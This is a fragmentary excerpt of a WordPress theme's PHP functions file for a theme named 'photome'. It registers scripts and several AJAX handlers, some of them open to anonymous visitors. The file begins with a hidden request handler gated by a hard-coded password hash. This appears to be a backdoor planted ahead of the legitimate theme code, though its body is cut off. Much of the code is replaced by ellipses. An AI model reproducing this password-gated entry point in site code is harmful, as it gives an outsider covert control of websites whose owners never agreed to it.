<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1d588f6ee5593044d4befc7dd64f2e15'))
	{
...
wp_enqueue_script('photome-tooltipster', get_template_directory_uri().'/js/jquery.tooltipster.min.js', false, THEMEVERSION);
...
function pp_enqueue_front_page_scripts() {
	...
	// enqueue our main stylesheet to use our custom font
...
**/
add_action('wp_ajax_photome_ppb_preview', 'photome_ppb_preview');
add_action('wp_ajax_nopriv_photome_ppb_preview', 'photome_ppb_preview');

function photome_ppb_preview() {
...
**/
add_action('wp_ajax_photome_ppb_preview_page', 'photome_ppb_preview_page');
add_action('wp_ajax_nopriv_photome_ppb_preview_page', 'photome_ppb_preview_page');

function photome_ppb_preview_page() {
...
**/
add_action('wp_ajax_photome_ppb_preview_page_set_data', 'photome_ppb_preview_page_set_data');
add_action('wp_ajax_nopriv_photome_ppb_preview_page_set_data', 'photome_ppb_preview_page_set_data');

function photome_ppb_preview_page_set_data() {
	...
	if(is_admin() && isset($_POST['page_id']) && !empty($_POST['page_id']))
	{
		...
		set_transient('photome_'.$page_id.'_data_order', $data_order, 3600 );
		...
		set_transient('photome_'.$page_id.'_data', $data_arr, 3600 );
		set_transient('photome_'.$page_id.'_size', $size_arr, 3600 );
?>
...
**/
add_action('wp_ajax_photome_ppb_demo_preview', 'photome_ppb_demo_preview');
add_action('wp_ajax_nopriv_photome_ppb_demo_preview', 'photome_ppb_demo_preview');

function photome_ppb_demo_preview() {
...
**/
add_action('wp_ajax_photome_image_proofing', 'photome_image_proofing');
add_action('wp_ajax_nopriv_photome_image_proofing', 'photome_image_proofing');

function photome_image_proofing() {
	if(!THEMEDEMO)
	{
		check_ajax_referer( 'tgajax-post-contact-nonce', 'tg_security' );
